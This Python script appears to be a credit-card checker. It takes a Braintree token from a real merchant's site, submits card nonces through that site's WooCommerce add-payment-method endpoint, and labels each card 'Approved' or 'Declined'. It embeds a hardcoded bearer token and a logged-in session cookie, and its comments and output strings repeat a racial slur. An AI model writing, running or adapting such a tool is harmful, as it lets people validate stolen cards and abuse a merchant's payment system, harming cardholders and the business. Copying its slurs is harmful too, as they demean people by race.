import requests
import re
import json

#@diwazz

print("Step 1: Getting Braintree Client Token...")

graphql_headers = {
    'accept': '*/*',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTk1NDI5ODMsImp0aSI6ImU3ZjdkY2UyLTA3NmEtNDJjNC1hYWJkLTQ0MWFkNWQ1OGQyNyIsInN1YiI6Ijg1Zmh2amhocTZqMnhoazgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1Zmh2amhocTZqMnhoazgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnt9fQ.JTVeTftcu7HlJFES4n1SQ506W2D8FvhkiA7D_bibDHXsNtGzaioVwDd-EtoVr17P2kMs79ZyVfdAO3S2g0Hcwg',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://altairtech.io',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
}

# Maine  query ko chota kar diya hai sirf 'accessToken' nikalne ke liye.
graphql_json_data = {
    'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': '9005fad8-c1f4-474a-9777-a0379f6e57a0'},
    'query': 'query ClientConfiguration { clientConfiguration { braintreeApi { accessToken } } }',
    'operationName': 'ClientConfiguration',
}

try:
    # Pehla request bhejein
    graphql_response = requests.post('https://payments.braintree-api.com/graphql', headers=graphql_headers, json=graphql_json_data)
    graphql_response.raise_for_status() # Error check

    #yaha sai client nigga token aayega 
    # JSON response se token extract karein
    response_data = graphql_response.json()
    client_token = response_data['data']['clientConfiguration']['braintreeApi']['accessToken']
    
    print(f"Successfully got Braintree Client Token (Authorization Fingerprint).")
    # print(f"Token: {client_token}") # Uncomment to see the full token

except (requests.exceptions.RequestException, KeyError, TypeError) as e:
    print(f"Error getting Braintree token: {e}")
    exit() # Agar token nahi mila to script band kar dein

#@diwazz
# Yeh aapka doosra code block hai.

print("\nStep 2: Submitting card to get final status...")

# static cookies aur data nigga 
site_cookies = {
    'wordpress_logged_in_7c33bd78f71e082d62697d13f74a0021': 'ximipo2069%7C1760666086%7CPxWLLf0sboMQ9Z1DOqXHM8VlULMzf1mU15KbqY2iRm9%7Cdea7b4551f2256e5ce83d8302d435395bf613f6e6cd8d4ab9f32226f3ee85cd5',
}
site_headers = {
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://altairtech.io',
    'referer': 'https://altairtech.io/account/add-payment-method/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
}
site_data = {
    'payment_method': 'braintree_credit_card',
    'wc_braintree_credit_card_payment_nonce': 'tokencc_bf_xxdj9c_k4234w_cwqb2f_7s48x5_wx2', 
    'woocommerce-add-payment-method-nonce': 'c6c5c34790', 
    '_wp_http_referer': '/account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

try:
    # Doosra request bhejein niggggggga
    final_response = requests.post('https://altairtech.io/account/add-payment-method/', cookies=site_cookies, headers=site_headers, data=site_data)
    final_response.raise_for_status() # Error check

    #abb yaha sai final card approved ya declined niklega 
    #@diwazz
    html_text = final_response.text
    pattern = r'Status code\s*([^<]+)\s*</li>'
    match = re.search(pattern, html_text)
    
    print("\n--- FINAL RESULT NIGGA ---")
    if match:
        # Agar status mil gaya
        final_status = match.group(1).strip()
        print(f"Card_Declined, Response: {final_status}")
    elif "Payment method successfully added." in html_text:
        # Agar card approve ho gaya
        print("Card_Approved, Response: Payment method successfully added.")
    else:
        # Agar koi status nahi mila
        print("Could not find the status message in the response.")

except requests.exceptions.RequestException as e:
    print(f"Error during final submission: {e}")
